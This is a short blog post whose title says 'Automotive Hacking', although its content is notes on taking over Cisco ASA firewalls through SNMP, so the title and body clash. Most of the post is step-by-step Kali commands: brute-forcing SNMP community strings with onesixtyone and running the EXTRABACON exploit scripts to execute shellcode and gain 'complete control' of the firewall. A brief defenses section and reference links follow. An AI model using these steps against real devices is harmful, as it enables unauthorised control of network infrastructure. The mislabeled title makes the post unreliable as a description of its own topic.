---
layout: post
title: Automotive Hacking
subtitle: Overview and Notes
cover-img: /assets/img/path.jpg
tags: [API, Security]
---

This exploit requires;
1. SNMP be enabled on the device
2. Knowledge of the community string in any version of SNMP (v1,v2,v3)
2. an attack with IPv4 packets only
4. Access to a system residing on the interface to the firewall


Steps- 
	• Get SNMP <IP> from Wireshark 
	• Use snmpcheck -t <IP>

Cracking SNMP community strings( if not set to "public")
	kali > onesixtyone 192.168.1.102 -c /usr/share/doc/onesixtyone/dict.txt
	
	
	kali > ./extrabacon info -t 192.168.1.101 -c hackers-arise
		This will return a file that we need in exec mode of EXTRABACON. Here, I have named that file OTW
	kali > ./extrabacon_1.1.0.1.py exec -k OTW -t 192.168.1.101 -c hackers-arise --mode pass-enable
		When the exploit is successful, it will execute the shellcode on the Cisco ASA firewall, giving the attacker complete control!
				
Defenses
Until Cisco releases a patch for this exploit, your best defenses are two.
1. Make your SNMP community string long and complex
2. Disable SNMP on the vulnerable device (no snmp-server enable)


For more info - [Reference](https://www.hackers-arise.com/post/2019/03/23/network-basics-for-hackers-simple-network-management-protocol-snmp-theory-reconnaissance)
Zero Day - [NSA Exploit in CISCO ASA]( https://www.hackers-arise.com/post/2016/08/22/the-extrabacon-zero-day-exploit-on-cisco-asa-firewalls)
